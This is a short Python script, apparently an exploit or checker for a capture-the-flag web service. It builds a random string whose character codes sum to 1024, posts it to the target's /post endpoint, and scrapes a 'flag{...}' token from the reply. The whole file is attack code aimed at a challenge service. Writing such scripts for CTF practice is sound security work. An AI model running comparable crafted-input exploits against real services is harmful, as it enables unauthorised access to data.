#!/usr/bin/python2.7
#coding:utf-8

from sys import *
import requests
import re,string,random
# import hackhttp

host = argv[1]
port = int(argv[2])
timeout = 30
target = "http://%s:%s"%(host,port)
def randomString(stringLength=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))
    
def gen_str_atk(i):
    text = randomString(i)
    v = sum(map(ord, text))
    while v!=1024:
        text = randomString(i)
        v = sum(map(ord, text))
    return text, (v%2 == 0)
def exp():
    try:
        t= requests.post(target+'/post',data={'title':'a','author':'b','content':gen_str_atk(9)},timeout=timeout,headers={'User-Agent':'checker'}).text
        # print(t)
        rr = re.findall(r'flag{.*?}',t)
        print(rr)
        return rr
    except Exception as e:
        print('fail')
        exit(0)
    
if __name__ == '__main__':
    print(exp())
